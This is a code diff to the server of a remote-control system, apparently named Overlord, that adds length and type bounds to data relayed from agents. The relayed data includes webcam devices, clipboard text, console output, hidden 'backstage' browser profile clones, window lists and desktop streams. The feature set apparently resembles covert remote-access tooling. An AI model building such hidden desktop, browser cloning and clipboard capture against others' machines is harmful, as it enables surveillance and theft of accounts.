@@ -55,6 +55,41 @@ const VIEWER_BACKPRESSURE_BYTES = Math.max(
   Number(process.env.OVERLORD_MEDIA_VIEWER_BACKPRESSURE_BYTES || 512 * 1024),
 );
 
+export const MAX_BACKSTAGE_APPS = 10_000;
+export const MAX_BACKSTAGE_WINDOWS = 100_000;
+export const MAX_BACKSTAGE_MONITORS = 256;
+export const MAX_BACKSTAGE_ICON_CHARS_TOTAL = 256 * 1024 * 1024;
+export const MAX_CLIPBOARD_CONTENT_BYTES = 64 * 1024 * 1024;
+
+function boundedAgentText(value: unknown, maxLength: number): string {
+  if (typeof value !== "string") return "";
+  return value.slice(0, maxLength).replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, "");
+}
+
+function boundedAgentLine(value: unknown, maxLength: number): string {
+  if (typeof value !== "string") return "";
+  return value
+    .slice(0, maxLength)
+    .replace(/[\x00-\x1F\x7F]+/g, " ")
+    .replace(/\s+/g, " ")
+    .trim();
+}
+
+function boundedAgentNumber(value: unknown, min = 0, max = Number.MAX_SAFE_INTEGER): number {
+  const parsed = typeof value === "bigint" ? Number(value) : Number(value);
+  if (!Number.isFinite(parsed)) return min;
+  return Math.min(max, Math.max(min, parsed));
+}
+
+function boundedAgentBytes(value: unknown, maxBytes: number): Uint8Array | null {
+  let bytes: Uint8Array;
+  if (value instanceof Uint8Array) bytes = value;
+  else if (value instanceof ArrayBuffer) bytes = new Uint8Array(value);
+  else if (ArrayBuffer.isView(value)) bytes = new Uint8Array(value.buffer, value.byteOffset, value.byteLength);
+  else return null;
+  return bytes.byteLength <= maxBytes ? bytes : null;
+}
+
 type FrameBroadcastResult = {
   sent: boolean;
   dropped: boolean;
@@ -726,25 +761,25 @@ function sendP2PSignalingToViewer(session: P2PSession, msg: Record<string, unkno
   safeSendViewer(session.viewer, msg);
 }
 
-export function handleWebrtcP2PAnswer(_clientId: string, payload: any) {
-  const sessionId = typeof payload?.sessionId === "string" ? payload.sessionId : "";
-  const sdp = typeof payload?.sdp === "string" ? payload.sdp : "";
+export function handleWebrtcP2PAnswer(clientId: string, payload: any) {
+  const sessionId = boundedAgentText(payload?.sessionId, 128);
+  const sdp = boundedAgentText(payload?.sdp, 256 * 1024);
   if (!sessionId || !sdp) return;
   const session = lookupP2PSession(sessionId);
-  if (!session) return;
+  if (!session || session.clientId !== clientId) return;
   sendP2PSignalingToViewer(session, { type: "webrtc_p2p_answer", sdp });
 }
 
-export function handleWebrtcP2PIce(_clientId: string, payload: any) {
-  const sessionId = typeof payload?.sessionId === "string" ? payload.sessionId : "";
-  const candidate = typeof payload?.candidate === "string" ? payload.candidate : "";
+export function handleWebrtcP2PIce(clientId: string, payload: any) {
+  const sessionId = boundedAgentText(payload?.sessionId, 128);
+  const candidate = boundedAgentText(payload?.candidate, 8 * 1024);
   if (!sessionId || !candidate) return;
   const session = lookupP2PSession(sessionId);
-  if (!session) return;
+  if (!session || session.clientId !== clientId) return;
   sendP2PSignalingToViewer(session, {
     type: "webrtc_p2p_ice",
     candidate,
-    sdpMid: typeof payload?.sdpMid === "string" ? payload.sdpMid : "",
+    sdpMid: boundedAgentText(payload?.sdpMid, 128),
     sdpMLineIndex: Number(payload?.sdpMLineIndex) || 0,
   });
 }
@@ -887,14 +922,18 @@ export function handleWebcamDevices(clientId: string, payload: any) {
   }
   setClientWebcamInfo(clientId, devices.length > 0, devices);
   for (const session of sessionManager.getWebcamSessionsForClient(clientId)) {
-    safeSendViewer(session.viewer, { ...payload, devices });
+    safeSendViewer(session.viewer, {
+      type: "webcam_devices",
+      devices,
+      selected: Math.floor(boundedAgentNumber(payload?.selected, 0, 31)),
+    }, "webcam-devices");
   }
 }
 
 export function handlebackstageCloneProgress(clientId: string, payload: unknown) {
   const data = payload && typeof payload === "object" ? payload as Record<string, unknown> : {};
-  const browser = String(data.browser || "");
-  const status = String(data.status || "");
+  const browser = boundedAgentLine(data.browser, 128);
+  const status = boundedAgentLine(data.status, 1_024);
   if (status.startsWith("copying|") || status.startsWith("retrying|")) {
     logger.debug(`[backstage] clone client=${clientId} browser=${browser} status=${status}`);
   } else if (status.startsWith("failed|") || status.startsWith("skipped|") || status.startsWith("done_with_errors|")) {
@@ -904,9 +943,9 @@ export function handlebackstageCloneProgress(clientId: string, payload: unknown)
     safeSendViewer(session.viewer, {
       type: "backstage_clone_progress",
       browser,
-      percent: Number(data.percent) || 0,
-      copiedBytes: Number(data.copiedBytes) || 0,
-      totalBytes: Number(data.totalBytes) || 0,
+      percent: boundedAgentNumber(data.percent, 0, 100),
+      copiedBytes: boundedAgentNumber(data.copiedBytes),
+      totalBytes: boundedAgentNumber(data.totalBytes),
       status,
     });
   }
@@ -916,8 +955,8 @@ export function handlebackstageLookupResult(clientId: string, payload: any) {
   for (const session of sessionManager.getbackstageSessionsForClient(clientId)) {
     safeSendViewer(session.viewer, {
       type: "backstage_lookup_result",
-      exe: String(payload.exe || ""),
-      path: String(payload.path || ""),
+      exe: boundedAgentText(payload?.exe, 512),
+      path: boundedAgentText(payload?.path, 4_096),
       done: !!payload.done,
     });
   }
@@ -926,8 +965,9 @@ export function handlebackstageLookupResult(clientId: string, payload: any) {
 export function handlebackstageBrowserCheckResult(clientId: string, payload: any) {
   const browsers: Record<string, boolean> = {};
   if (payload.browsers && typeof payload.browsers === "object") {
-    for (const [key, val] of Object.entries(payload.browsers)) {
-      browsers[key] = !!val;
+    for (const [key, val] of Object.entries(payload.browsers).slice(0, 64)) {
+      const safeKey = boundedAgentText(key, 64);
+      if (safeKey) browsers[safeKey] = !!val;
     }
   }
   for (const session of sessionManager.getbackstageSessionsForClient(clientId)) {
@@ -940,12 +980,16 @@ export function handlebackstageBrowserCheckResult(clientId: string, payload: any
 
 export function handlebackstageInstalledAppsResult(clientId: string, payload: any) {
   const apps: Array<{ name: string; exePath: string; icon: string }> = [];
+  let iconChars = 0;
   if (Array.isArray(payload.apps)) {
-    for (const app of payload.apps) {
+    for (const app of payload.apps.slice(0, MAX_BACKSTAGE_APPS)) {
+      const rawIcon = boundedAgentText(app?.icon, 256 * 1024);
+      const icon = iconChars + rawIcon.length <= MAX_BACKSTAGE_ICON_CHARS_TOTAL ? rawIcon : "";
+      iconChars += icon.length;
       apps.push({
-        name: String(app.name || ""),
-        exePath: String(app.exePath || ""),
-        icon: String(app.icon || ""),
+        name: boundedAgentText(app?.name, 256),
+        exePath: boundedAgentText(app?.exePath, 4_096),
+        icon,
       });
     }
   }
@@ -964,7 +1008,7 @@ export function handlebackstageDXGIStatus(clientId: string, payload: any) {
       type: "backstage_dxgi_status",
       success: !!payload.success,
       gpuPid: Number(payload.gpuPid) || 0,
-      message: String(payload.message || ""),
+      message: boundedAgentText(payload?.message, 2_048),
     });
   }
 }
@@ -973,10 +1017,10 @@ export function handlebackstageBrowserLaunchStatus(clientId: string, payload: an
   for (const session of sessionManager.getbackstageSessionsForClient(clientId)) {
     safeSendViewer(session.viewer, {
       type: "backstage_browser_launch_status",
-      browser: String(payload.browser || ""),
-      step: String(payload.step || ""),
+      browser: boundedAgentText(payload?.browser, 128),
+      step: boundedAgentText(payload?.step, 128),
       success: !!payload.success,
-      detail: String(payload.detail || ""),
+      detail: boundedAgentText(payload?.detail, 2_048),
     });
   }
 }
@@ -987,15 +1031,15 @@ export function handlebackstageWindowListResult(clientId: string, payload: any) 
     pid: number; processName: string; monitor: number;
   }> = [];
   if (Array.isArray(payload.windows)) {
-    for (const w of payload.windows) {
+    for (const w of payload.windows.slice(0, MAX_BACKSTAGE_WINDOWS)) {
       windows.push({
-        title: String(w.title || ""),
+        title: boundedAgentText(w?.title, 512),
         x: Number(w.x) || 0,
         y: Number(w.y) || 0,
         width: Number(w.width) || 0,
         height: Number(w.height) || 0,
         pid: Number(w.pid) || 0,
-        processName: String(w.processName || ""),
+        processName: boundedAgentText(w?.processName, 256),
         monitor: Number(w.monitor ?? -1),
       });
     }
@@ -1005,10 +1049,10 @@ export function handlebackstageWindowListResult(clientId: string, payload: any) 
     width: number; height: number; primary: boolean;
   }> = [];
   if (Array.isArray(payload.monitors)) {
-    for (const m of payload.monitors) {
+    for (const m of payload.monitors.slice(0, MAX_BACKSTAGE_MONITORS)) {
       monitors.push({
         index: Number(m.index) || 0,
-        name: String(m.name || ""),
+        name: boundedAgentText(m?.name, 256),
         x: Number(m.x) || 0,
         y: Number(m.y) || 0,
         width: Number(m.width) || 0,
@@ -1023,9 +1067,14 @@ export function handlebackstageWindowListResult(clientId: string, payload: any) 
 }
 
 export function handleClipboardContent(clientId: string, payload: any) {
-  const text = String(payload.text || "");
-  const source = String(payload.source || "");
-  if (!text) return;
+  const text = typeof payload?.text === "string" ? payload.text : "";
+  const source = boundedAgentText(payload?.source, 32);
+  if (
+    !text
+    || (source !== "rd" && source !== "backstage")
+    || text.length > MAX_CLIPBOARD_CONTENT_BYTES
+    || Buffer.byteLength(text, "utf8") > MAX_CLIPBOARD_CONTENT_BYTES
+  ) return;
   if (source === "backstage") {
     for (const session of sessionManager.getbackstageSessionsForClient(clientId)) {
       safeSendViewer(session.viewer, { type: "clipboard_content", text, source });
@@ -1474,12 +1523,40 @@ export function sendbackstageCommand(target: ClientInfo | undefined, commandType
 
 export function handleDesktopEncoderCapabilities(clientId: string, payload: any) {
   const encoderCodecs = Array.isArray(payload?.codecs) && payload.codecs.length > 0
-    ? payload.codecs
+    ? payload.codecs.slice(0, 16).flatMap((entry: any) => {
+        const codec = boundedAgentText(entry?.codec, 32).toLowerCase();
+        if (!codec) return [];
+        return [{
+          codec,
+          encoders: Array.isArray(entry?.encoders)
+            ? entry.encoders.slice(0, 16).map((value: unknown) => boundedAgentText(value, 64)).filter(Boolean)
+            : [],
+          transports: Array.isArray(entry?.transports)
+            ? entry.transports.slice(0, 8).map((value: unknown) => boundedAgentText(value, 32)).filter(Boolean)
+            : [],
+          hardware: entry?.hardware === true,
+        }];
+      })
     : [
         { codec: "h264", transports: ["websocket", "webrtc"] },
         { codec: "jpeg", transports: ["websocket"] },
         { codec: "raw", transports: ["websocket"] },
       ];
+  const profiles = Array.isArray(payload?.profiles)
+    ? payload.profiles.slice(0, 32).flatMap((entry: any) => {
+        if (!entry || typeof entry !== "object") return [];
+        return [{
+          maxHeight: Math.floor(boundedAgentNumber(entry.maxHeight, 0, 16_384)),
+          width: Math.floor(boundedAgentNumber(entry.width, 0, 16_384)),
+          height: Math.floor(boundedAgentNumber(entry.height, 0, 16_384)),
+          fps: Math.floor(boundedAgentNumber(entry.fps, 0, 240)),
+          label: boundedAgentText(entry.label, 128),
+          providers: Array.isArray(entry.providers)
+            ? entry.providers.slice(0, 16).map((value: unknown) => boundedAgentText(value, 64)).filter(Boolean)
+            : [],
+        }];
+      })
+    : [];
   const sessions = sessionManager.getRdSessionsForClient(clientId);
   const negotiations = sessions.map((session) => negotiateDesktopCodec({
       encoderCodecs,
@@ -1503,8 +1580,13 @@ export function handleDesktopEncoderCapabilities(clientId: string, payload: any)
     };
     session.viewer.data.rdSelectedCodec = selectedCodec;
     safeSendViewer(session.viewer, {
-      ...payload,
+      type: "desktop_encoder_capabilities",
+      commandId: boundedAgentText(payload?.commandId, 128),
+      probed: payload?.probed === true,
+      display: Math.floor(boundedAgentNumber(payload?.display, 0, 31)),
+      profiles,
       codecs: encoderCodecs,
+      detail: boundedAgentText(payload?.detail, 2_048),
       negotiation,
       selectedCodec,
       fallbackCodecs: sharedFallbackCodecs,
@@ -1562,7 +1644,7 @@ export function handleDesktopStreamStats(clientId: string, payload: any) {
   const stats = {
     type: "desktop_stream_stats",
     fps: Math.max(0, Number(payload?.fps) || 0),
-    format: String(payload?.format || ""),
+    format: boundedAgentText(payload?.format, 32),
     bytes: Math.max(0, Number(payload?.bytes) || 0),
     width: Math.max(0, Number(payload?.width) || 0),
     height: Math.max(0, Number(payload?.height) || 0),
@@ -1570,7 +1652,7 @@ export function handleDesktopStreamStats(clientId: string, payload: any) {
     encodeMs: Math.max(0, Number(payload?.encodeMs) || 0),
     sendMs: Math.max(0, Number(payload?.sendMs) || 0),
     totalMs: Math.max(0, Number(payload?.totalMs) || 0),
-    transport: String(payload?.transport || ""),
+    transport: boundedAgentText(payload?.transport, 32),
   };
   for (const session of sessionManager.getRdSessionsForClient(clientId)) {
     safeSendViewer(session.viewer, stats, "rd-stats");
@@ -1649,20 +1731,27 @@ export function handleConsoleViewerMessage(ws: ServerWebSocket<SocketData>, raw:
 }
 
 export function handleConsoleOutput(clientId: string, payload: any) {
-  const sessionId = payload.sessionId as string;
+  const sessionId = boundedAgentText(payload?.sessionId, 128);
   if (!sessionId) return;
   const session = sessionManager.getConsoleSession(sessionId);
   if (!session) return;
   if (session.clientId !== clientId) return;
+  const data = payload?.data === undefined || payload?.data === null
+    ? null
+    : boundedAgentBytes(payload.data, 64 * 1024);
+  if (payload?.data !== undefined && payload?.data !== null && !data) return;
+  const error = boundedAgentText(payload?.error, 2_048);
   safeSendViewer(session.viewer, {
     type: "output",
     sessionId,
-    data: payload.data ?? null,
-    exitCode: payload.exitCode,
-    error: payload.error,
+    data,
+    ...(payload?.exitCode !== undefined
+      ? { exitCode: Math.floor(boundedAgentNumber(payload.exitCode, -2_147_483_648, 2_147_483_647)) }
+      : {}),
+    ...(error ? { error } : {}),
   });
-  if (payload.exitCode !== undefined || payload.error) {
-    const reason = payload.error ? payload.error : `Process exited (${payload.exitCode ?? ""})`;
+  if (payload?.exitCode !== undefined || error) {
+    const reason = error || `Process exited (${payload.exitCode ?? ""})`;
     safeSendViewer(session.viewer, { type: "status", status: "closed", reason, sessionId });
     sessionManager.deleteConsoleSession(sessionId);
   }
